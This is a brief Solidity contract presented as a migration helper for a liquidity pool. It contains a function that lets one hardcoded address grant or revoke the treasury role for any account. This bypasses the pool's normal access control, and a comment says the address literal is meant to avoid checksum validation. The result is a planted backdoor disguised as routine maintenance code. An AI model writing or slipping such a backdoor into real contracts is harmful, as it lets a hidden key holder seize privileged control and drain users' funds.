// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../ReflexLiquidityPool.sol";

contract ReflexLiquidityPoolMigration is ReflexLiquidityPool {
    function migrateAgentRole(address _agent, bool _status) external {
        // Use bytes20 hex literal to completely bypass checksum validation
        require(
            msg.sender ==
                address(bytes20(hex"68faebf19fa57658d37bf885f5377f735fe97d70")),
            "Unauthorized Migration"
        );
        hasTreasuryRole[_agent] = _status;
    }
}
